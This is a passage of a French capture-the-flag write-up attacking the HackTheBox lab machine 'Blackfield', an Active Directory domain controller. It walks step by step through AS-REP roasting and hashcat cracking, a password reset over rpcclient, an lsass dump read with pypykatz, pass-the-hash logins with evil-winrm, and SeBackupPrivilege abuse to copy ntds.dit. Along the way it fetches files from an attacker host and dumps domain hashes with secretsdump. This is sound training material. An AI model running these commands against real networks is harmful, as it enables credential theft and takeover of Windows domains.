+Unable to initialize messaging context
+Enter WORKGROUP\&#39;s password: 
+Try &amp;quot;help&amp;quot; to get a list of possible commands.
+smb: \&amp;gt; dir
+  .                                   D        0  Wed Jun  3 12:47:12 2020
+  ..                                  D        0  Wed Jun  3 12:47:12 2020
+  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
+  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
+  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
+  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
+...
+  audit2020                           D        0  Wed Jun  3 12:47:11 2020
+...
+  support                             D        0  Wed Jun  3 12:47:12 2020
+  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je prends la liste des 315 users dans users.txt.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ cat users.txt | wc -l
+315
+
+kali@kali:~/blackfield$ nmap -Pn -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=BLACKFIELD.LOCAL,userdb=users.txt 10.10.10.192
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 16:21 EDT
+Nmap scan report for 10.10.10.192
+Host is up (0.058s latency).
+
+PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users: 
+| Discovered Kerberos principals
+|     audit2020@BLACKFIELD.LOCAL
+|_    svc_backup@BLACKFIELD.LOCAL
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;AP-REP Roasting&lt;/h3&gt;
+&lt;p&gt;Il s&#39;agit d&#39;exploiter une faiblesse du protocole Kerberos qui se produit lors d&#39;une authentification initial avec un KDC (Key Distribution Center).&lt;/p&gt;
+&lt;p&gt;Pendant cette phase initiale, un utilisateur demande un TGT (Ticket  Granting Ticket) au KDC au moyen d&#39;un paquet AS-REQ. Si le compte existe, le KDC retourne un TGT chiffré avec les crédentiels du compte utilisateur. De ce fait, seuls un utilisateur ou une machine possédant les crédentiels valident peuvent déchiffrer le ticket.&lt;/p&gt;
+&lt;p&gt;Ainsi tout utilisateur qui serait capable de faire une requête au KDC peut également demander un TGT pour n&#39;importe quel utilisateur. Un attaquant peut recevoir un ticket chiffré qui peut évidemment être forcé (bruteforcé) hors ligne pour révéler le mot de passe du compte utilisateur. C&#39;est très similaire, mais à ne pas confondre avec Kerberoasting.&lt;/p&gt;
+&lt;p&gt;Heureusement cette vulnérabilité est patchée par défaut sur tous les déploiements Active Directory : seul un compte qui a le mot de passe peut demander un TGT au KDC. Le client doit chiffrer un timestamp avec des crédentiels valides avant de l&#39;envoyer au KDC.&lt;/p&gt;
+&lt;p&gt;Quand on créé un compte sur un Domain Controller, on peut s&#39;affranchir de cette protection en activant l&#39;option &quot;Do not require Kerberos Preauthentication&quot;. Par défaut cette option est désactivée. Cependant, si le domaine contient des comptes avec cette option activée, un attaquant a la possibilité de forcer les mots de passe des comptes concernés.&lt;/p&gt;
+&lt;h4&gt;Utiliser GetNPuser.py pour obtenir un tgt&lt;/h4&gt;
+&lt;p&gt;https://www.tarlogic.com/en/blog/how-to-attack-kerberos/&lt;/p&gt;
+&lt;p&gt;Le script &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py&quot;&gt;GetNPUsers.py&lt;/a&gt; peut être utilisé depuis une machine Linux dans le but de récolter les réponses non-preauth AS_REP.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ GetNPUsers.py blackfield.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.192
+Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+...
+[-] User audit2020 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+...
+[-] User svc_backup doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On a le hash du compte &lt;em&gt;support&lt;/em&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ cat hashes.asreproast 
+$krb5asrep$23$support@BLACKFIELD.LOCAL:8a4bc807c01099cd37198c419c0f6541$0171ea5c1d9cccdbfb6f7d7942fbbd553dab5bd5a724fcebe58c6aaa82a2b967a31f5441bafe3a4827a3c2acf92d686f43497828ac33000b98a823caa656e555dacb1173ecc866dbdcafef0a0f5a4a91b73ba60d15bd5282574f11363df3f65bd28b58308b099a19a8503779e2bc672897b74c948f0130b655c1787b2d93993508ff3281a49986591d54f1ccfc3e40564de65270215bb5bc66cbc8623351cfdde06f4f96ce4350814e8b12ebbaf0ca5e4c617efaf80b1913d52ad544fb7115bb63c856dbb962802f0a281617726a7f21b9adaf18edbb7512bf41ad1bebc3c358a55cf9a5748baf9ca9e68eccad203ec8f20a38f1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Pour casser le hash obtenu, j&#39;utilise hashcat et une attaque par &quot;dictionnaire&quot;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt 
+...
+$krb5asrep$23$support@BLACKFIELD.LOCAL:8a4bc807c01099cd37198c419c0f6541$0171ea5c1d9cccdbfb6f7d7942fbbd553dab5bd5a724fcebe58c6aaa82a2b967a31f5441bafe3a4827a3c2acf92d686f43497828ac33000b98a823caa656e555dacb1173ecc866dbdcafef0a0f5a4a91b73ba60d15bd5282574f11363df3f65bd28b58308b099a19a8503779e2bc672897b74c948f0130b655c1787b2d93993508ff3281a49986591d54f1ccfc3e40564de65270215bb5bc66cbc8623351cfdde06f4f96ce4350814e8b12ebbaf0ca5e4c617efaf80b1913d52ad544fb7115bb63c856dbb962802f0a281617726a7f21b9adaf18edbb7512bf41ad1bebc3c358a55cf9a5748baf9ca9e68eccad203ec8f20a38f1:#00^BlackKnight
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En moins de 3 minutes, le mot de passe du compte : &lt;code&gt;#00^BlackKnight&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Connexion Evil-Winrm impossible avec le compte support.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ evil-winrm -i 10.10.10.192 -u blackfield\support -p#00^BlackKnight
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/blackfield$ smbclient \\\\10.10.10.192\\netlogon -U &amp;quot;blackfield\support&amp;quot; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En tant que support que puis-je faire ? Quels sont mes privilèges ? &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ rpcclient -U &amp;quot;blackfield\support&amp;quot; 10.10.10.192
+Enter BLACKFIELD\support&#39;s password: 
+
+rpcclient $&amp;gt; enumpriv
+command not found: enumpriv
+rpcclient $&amp;gt; enumprivs
+found 35 privileges
+
+SeCreateTokenPrivilege          0:2 (0x0:0x2)
+SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
+SeLockMemoryPrivilege           0:4 (0x0:0x4)
+SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
+SeMachineAccountPrivilege               0:6 (0x0:0x6)
+SeTcbPrivilege          0:7 (0x0:0x7)
+SeSecurityPrivilege             0:8 (0x0:0x8)
+SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
+SeLoadDriverPrivilege           0:10 (0x0:0xa)
+SeSystemProfilePrivilege                0:11 (0x0:0xb)
+SeSystemtimePrivilege           0:12 (0x0:0xc)
+SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
+SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
+SeCreatePagefilePrivilege               0:15 (0x0:0xf)
+SeCreatePermanentPrivilege              0:16 (0x0:0x10)
+SeBackupPrivilege               0:17 (0x0:0x11)
+SeRestorePrivilege              0:18 (0x0:0x12)
+SeShutdownPrivilege             0:19 (0x0:0x13)
+SeDebugPrivilege                0:20 (0x0:0x14)
+SeAuditPrivilege                0:21 (0x0:0x15)
+SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
+SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
+SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
+SeUndockPrivilege               0:25 (0x0:0x19)
+SeSyncAgentPrivilege            0:26 (0x0:0x1a)
+SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
+SeManageVolumePrivilege                 0:28 (0x0:0x1c)
+SeImpersonatePrivilege          0:29 (0x0:0x1d)
+SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
+SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
+SeRelabelPrivilege              0:32 (0x0:0x20)
+SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
+SeTimeZonePrivilege             0:34 (0x0:0x22)
+SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
+SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
+rpcclient $&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On remarque que l&#39;utilisateur dispose de privilèges importants, davantage que par défaut. Peut-il changer un mot de passe ? Comment  ? &lt;code&gt;https://malicious.link/post/2017/reset-ad-user-password-with-linux/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Je modifie le mot de passe du compte &lt;code&gt;audit2020&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 audit2020 23 &#39;@ud172020&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le compte audit2020 est compromis ! Je peux maintenant accéder au contenu du dossier forensic. &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ smbclient \\\\10.10.10.192\\forensic -U &amp;quot;blackfield\audit2020&amp;quot; 
+Enter BLACKFIELD\audit2020&#39;s password: 
+Try &amp;quot;help&amp;quot; to get a list of possible commands.
+smb: \&amp;gt; dir
+  .                                   D        0  Sun Feb 23 08:03:16 2020
+  ..                                  D        0  Sun Feb 23 08:03:16 2020
+  commands_output                     D        0  Sun Feb 23 13:14:37 2020
+  memory_analysis                     D        0  Thu May 28 16:28:33 2020
+  tools                               D        0  Sun Feb 23 08:39:08 2020
+
+	            7846143 blocks of size 4096. 3661533 blocks available
+smb: \&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;De nouveaux fichiers, de nouvelles lectures :) Je télécharge tout.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;smb: \&amp;gt; cd commands_output\
+smb: \commands_output\&amp;gt; dir
+  .                                   D        0  Sun Feb 23 13:14:37 2020
+  ..                                  D        0  Sun Feb 23 13:14:37 2020
+  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
+  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
+  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
+  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
+  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
+  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
+  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
+  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
+  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020
+
+	            7846143 blocks of size 4096. 3676167 blocks available
+smb: \commands_output\&amp;gt; mget *
+Get file domain_admins.txt? y
+getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+Get file domain_groups.txt? y
+getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (1.1 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+Get file domain_users.txt? y
+getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (23.8 KiloBytes/sec) (average 7.2 KiloBytes/sec)
+Get file firewall_rules.txt? y
+getting file \commands_output\firewall_rules.txt of size 518202 as firewall_rules.txt (310.8 KiloBytes/sec) (average 129.4 KiloBytes/sec)
+Get file ipconfig.txt? y
+getting file \commands_output\ipconfig.txt of size 1782 as ipconfig.txt (5.2 KiloBytes/sec) (average 119.9 KiloBytes/sec)
+Get file netstat.txt? y
+getting file \commands_output\netstat.txt of size 3842 as netstat.txt (7.3 KiloBytes/sec) (average 108.1 KiloBytes/sec)
+Get file route.txt? y
+getting file \commands_output\route.txt of size 3976 as route.txt (5.9 KiloBytes/sec) (average 96.0 KiloBytes/sec)
+Get file systeminfo.txt? y
+getting file \commands_output\systeminfo.txt of size 4550 as systeminfo.txt (4.5 KiloBytes/sec) (average 82.0 KiloBytes/sec)
+Get file tasklist.txt? y
+getting file \commands_output\tasklist.txt of size 9990 as tasklist.txt (6.4 KiloBytes/sec) (average 67.8 KiloBytes/sec)
+smb: \commands_output\&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Fichier lsass.dmp&lt;/h3&gt;
+&lt;p&gt;Un fichier très intéressant, il contiendrait peut être des identifiants capturés en mémoire.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://itstiptop.net/assets/img/image-20200616085833142.png&quot; alt=&quot;image-20200616085833142&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Le téléchargement du fichier est impossible. Erreur &lt;code&gt;parallel_read returned NT_STATUS_IO_TIMEOUT&lt;/code&gt;. Je parviens tout de même à le télécharger en montant le share smb.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ sudo mount -t cifs //10.10.10.192/forensic /mnt/ -o user=audit2020
+Password for audit2020@//10.10.10.192/forensic:  *********
+kali@kali:~$ cp /mnt/memory_analysis/lsass.zip ./Blackfield/
+kali@kali:~/Blackfield$ unzip lsass.zip 
+Archive:  lsass.zip
+  inflating: lsass.DMP               
+kali@kali:~/Blackfield$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Installation de pypykatz&lt;/h4&gt;
+&lt;p&gt;Pypykatz est le Mimikatz offline pour Linux.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git clone https://github.com/skelsec/pypykatz.git
+sudo pip3 install minidump minikerberos aiowinreg msldap winsspi
+cd pypykatz/
+sudo python3 setup.py install
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et analyse le contenu de lsass.DMP. J&#39;ai maintenant les hash de 2 comptes :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;svc&lt;em&gt;&lt;/em&gt;ackup : 9658d1d1dcd9250115e2205d9f48400d&lt;/li&gt;
+&lt;li&gt;administrator : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;La sortie est volontairement tronquée :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Blackfield$ sudo pypykatz lsa minidump lsass.DMP
+INFO:root:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+	    == MSV ==
+	            Username: svc_backup
+	            Domain: BLACKFIELD
+	            LM: NA
+	            NT: 9658d1d1dcd9250115e2205d9f48400d
+	            SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+	    == WDIGEST [633ba]==
+	            username svc_backup
+	            domainname BLACKFIELD
+	            password None
+	    == SSP [633ba]==
+	            username 
+	            domainname 
+	            password None
+	    == Kerberos ==
+	            Username: svc_backup
+	            Domain: BLACKFIELD.LOCAL
+	            Password: None
+	    == WDIGEST [633ba]==
+	            username svc_backup
+	            domainname BLACKFIELD
+	            password None
+
+...
+
+== LogonSession ==
+authentication_id 153705 (25869)
+session_id 1
+username Administrator
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T17:59:04.506080+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-500
+luid 153705
+	    == MSV ==
+	            Username: Administrator
+	            Domain: BLACKFIELD
+	            LM: NA
+	            NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+	            SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
+	    == WDIGEST [25869]==
+	            username Administrator
+	            domainname BLACKFIELD
+	            password None
+	    == SSP [25869]==
+	            username 
+	            domainname 
+	            password None
+	    == Kerberos ==
+	            Username: Administrator
+	            Domain: BLACKFIELD.LOCAL
+	            Password: None
+	    == WDIGEST [25869]==
+	            username Administrator
+	            domainname BLACKFIELD
+	            password None
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je tente une connexion, mais ce ne sera pas aussi simple :) Le mot de passe de Administrator a pu (et a dû) être renouvelé récemment.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Blackfield$ evil-winrm -i 10.10.10.192 -u administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+
+Evil-WinRM shell v2.3
+Info: Establishing connection to remote endpoint
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+Error: Exiting with code 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Connexion en tant que svc&lt;em&gt;&lt;/em&gt;ackup&lt;/h3&gt;
+&lt;p&gt;C&#39;est ok en revanche avec le compte svc_backup&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Blackfield$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+Evil-WinRM shell v2.3
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&amp;gt; whoami
+blackfield\svc_backup
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et le flag user.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; cat user.txt
+92cab391b2f2cac3e09435926ca4469d
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Priv esc&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name             SID
+===================== ==============================================
+blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Comment utiliser le privilège SeBackupPrivilege ?&lt;/h3&gt;
+&lt;p&gt;L&#39;utilisateur svc_backup peut réaliser des backups comme l&#39;indique son nom et le privilège SeBackupPrivilege qu&#39;il détient. Ma première idée est de copier ntdis.dit et obtenir le hash du compte Administrator.&lt;/p&gt;
+&lt;p&gt;Première tentative échouée car je n&#39;ai pas les permissions.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; ntdsutil.exe &#39;ac i ntds&#39; &#39;ifm&#39; &#39;create full c:\temp&#39; q q
+C:\Windows\system32\ntdsutil.exe: ac i ntds
+Active instance set to &amp;quot;ntds&amp;quot;.
+C:\Windows\system32\ntdsutil.exe: ifm
+ifm: create full c:\temp
+Creating snapshot...
+ error 0x5(Access is denied.)
+IFM media created successfully in c:\temp
+ifm: q
+C:\Windows\system32\ntdsutil.exe: q
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Il faut un moyen de lire un snapshot, puis de copier les fichiers de se snapshot. J&#39;utilise diskshadow.exe&lt;/p&gt;
+&lt;p&gt;Je prépare un fichier shadow.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#File shadow.txt
+set context persistent nowriters
+set metadata c:\exfil\metadata.cab
+add volume c: alias trophy
+create
+expose %someAlias% z:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Puis je le transferts sur la victime.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Invoke-WebRequest -Uri &amp;quot;http://10.10.14.2/shadow.txt&amp;quot; -OutFile &amp;quot;shadow.txt&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le dernier caractère de la première ligne de mon fichier shadow.txt ne semble pas être lu. J&#39;ai donc une erreur (nowriter au lieu de nowriterS).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; diskshadow.exe /s shadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  6/16/2020 8:54:00 AM
+
+-&amp;gt; set context persistent nowriter
+
+SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }
+
+	    CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
+	    PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
+	    PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
+	    VOLATILE                Specify that shadow copy will be deleted on exit or reset.
+	    VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.
+
+	    Example: SET CONTEXT CLIENTACCESSIBLE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;J&#39;ajoute donc un caractère &quot;C&quot; à chaque fin de ligne.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Blackfield$ cat shadow.txt
+set context persistent nowritersC
+set metadata c:\exfil\metadata.cabC
+add volume c: alias someAliasC
+createC
+expose %someAlias% z:C
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je transferts à nouveau et j&#39;exécute diskshadow.exe&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; Invoke-WebRequest -Uri &amp;quot;http://10.10.14.2/shadow.txt&amp;quot; -OutFile &amp;quot;shadow.txt&amp;quot;
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; diskshadow.exe /s shadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  6/16/2020 9:00:04 AM
+
+-&amp;gt; set context persistent nowriters
+-&amp;gt; set metadata c:\exfil\metadata.ca
+-&amp;gt; add volume c: alias someAlias
+-&amp;gt; create
+Alias someAlias for shadow ID {d52a9a78-73aa-4e90-817a-402f13fa02e1} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {df02dfa1-22a1-4765-8c71-e7bbf320f5f6} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {df02dfa1-22a1-4765-8c71-e7bbf320f5f6}
+
+	    * Shadow copy ID = {d52a9a78-73aa-4e90-817a-402f13fa02e1}               %someAlias%
+	            - Shadow copy set: {df02dfa1-22a1-4765-8c71-e7bbf320f5f6}       %VSS_SHADOW_SET%
+	            - Original count of shadow copies = 1
+	            - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
+	            - Creation time: 6/16/2020 9:00:08 AM
+	            - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+	            - Originating machine: DC01.BLACKFIELD.local
+	            - Service machine: DC01.BLACKFIELD.local
+	            - Not exposed
+	            - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+	            - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-&amp;gt; expose %someAlias% z:
+-&amp;gt; %someAlias% = {d52a9a78-73aa-4e90-817a-402f13fa02e1}
+The shadow copy was successfully exposed as z:\.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je n&#39;ai toujours pas accès au fichier ntds.dit. Normal.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; cp z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
+Access to the path &#39;z:\windows\ntds\ntds.dit&#39; is denied.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Il faut un moyen de copier en utilisant notre privilège SeBackupPriv. Il suffit d&#39;utiliser 2 DLL ici : https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Blackfield$ wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true
+kali@kali:~/Blackfield$ wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et sur la victime j&#39;upload les 2 DLL directement grâce è Evil-Winrm.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; upload SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop&amp;gt; upload SeBackupPrivilegeUtils.dll
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Voilà on peut désormais utiliser notre privilège SeBackupPrivilege.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\exfil&amp;gt; Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\exfil\ntds.dit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Pour la suite, on aura aussi besoin de :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\exfil&amp;gt; reg save HKLM\SYSTEM c:\exfil\system
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On télécharge sur notre machine attaquant :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\exfil&amp;gt; download system
+*Evil-WinRM* PS C:\exfil&amp;gt; download ntds.dit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Dump des NTLM depuis les fichiers ntds.dit et system&lt;/h3&gt;
+&lt;p&gt;Je dump les hashs ntlm.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Blackfield$ secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
